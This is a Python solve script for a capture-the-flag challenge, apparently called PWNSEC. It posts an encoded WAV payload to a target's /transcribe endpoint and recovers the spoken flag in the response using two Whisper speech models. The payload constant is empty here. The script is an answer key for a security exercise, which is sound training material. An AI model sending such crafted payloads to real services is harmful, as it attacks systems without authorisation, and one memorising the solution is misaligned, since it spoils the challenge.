from __future__ import annotations

import base64
import contextlib
import difflib
import gzip
import io
import json
import re
import sys
import wave
from pathlib import Path

import numpy as np
import requests


ROOT = Path(__file__).resolve().parent
PAYLOAD_B64 = """"""


def load_url() -> str:
    config = json.loads((ROOT / "instance.json").read_text(encoding="utf-8"))
    endpoint = next(item for item in config["endpoints"] if item["name"] == "main")
    return endpoint["url"].rstrip("/")


def request_flag_audio(url: str) -> bytes:
    payload = gzip.decompress(base64.b64decode(PAYLOAD_B64))
    response = requests.post(
        f"{url}/transcribe",
        files={"file": ("payload.wav", payload, "audio/wav")},
        data={"response_format": "json"},
        timeout=90,
    )
    response.raise_for_status()
    body = response.json()
    if body.get("error"):
        raise RuntimeError(str(body["error"]))
    encoded = body["audio_data_url"].split(",", 1)[1]
    return base64.b64decode(encoded)


def wav_samples(data: bytes) -> np.ndarray:
    with wave.open(io.BytesIO(data), "rb") as wav:
        if wav.getnchannels() != 1 or wav.getsampwidth() != 2:
            raise RuntimeError("unexpected WAV format")
        samples = np.frombuffer(wav.readframes(wav.getnframes()), dtype="<i2")
    return samples.astype(np.float32) / 32768.0


def transcribe(data: bytes, model_name: str) -> str:
    import torch
    import whisper

    device = "cuda" if torch.cuda.is_available() else "cpu"
    null = io.StringIO()
    with contextlib.redirect_stdout(null), contextlib.redirect_stderr(null):
        model = whisper.load_model(model_name, device=device)
        transcript = model.transcribe(
            wav_samples(data),
            language="en",
            temperature=0,
            fp16=device == "cuda",
        )["text"]
    del model
    if device == "cuda":
        torch.cuda.empty_cache()
    return transcript


def spoken_body(transcript: str) -> str:
    compact = re.sub(r"[^0-9A-Z]", "", transcript.upper())
    match = re.search(r"LEFTBRACE(.*?)(?:RIGHT|RITE)BRACE", compact)
    if not match:
        raise RuntimeError(f"could not locate spoken flag braces: {transcript!r}")
    return match.group(1)


def merge_transcripts(segmented: str, phonetic: str) -> str:
    # medium.en preserves repeated-character count well; turbo identifies B/D
    # on this eSpeak voice more reliably but occasionally collapses repetitions.
    merged: list[str] = []
    for operation, a0, a1, b0, b1 in difflib.SequenceMatcher(
        None, segmented, phonetic, autojunk=False
    ).get_opcodes():
        if operation == "equal":
            merged.append(segmented[a0:a1])
        elif operation == "delete":
            merged.append(segmented[a0:a1])
        else:  # replace or insert: prefer turbo's phonetic identity
            merged.append(phonetic[b0:b1])
    return "".join(merged)


def recognize_flag(data: bytes) -> bytes:
    medium_text = transcribe(data, "medium.en")
    turbo_text = transcribe(data, "turbo")
    body = merge_transcripts(spoken_body(medium_text), spoken_body(turbo_text))

    flag = f"PWNSEC{{{body}}}".encode()
    if not re.fullmatch(rb"PWNSEC\{[0-9A-F]{16}\}", flag):
        raise RuntimeError(
            f"unexpected spoken flag body: medium={medium_text!r}, turbo={turbo_text!r}"
        )
    return flag


def main() -> int:
    try:
        audio = request_flag_audio(load_url())
        output = ROOT / "output"
        output.mkdir(exist_ok=True)
        (output / "flag-audio.wav").write_bytes(audio)
        sys.stdout.buffer.write(recognize_flag(audio))
        return 0
    except Exception as exc:
        print(f"solve failed: {exc}", file=sys.stderr)
        return 1


if __name__ == "__main__":
    raise SystemExit(main())
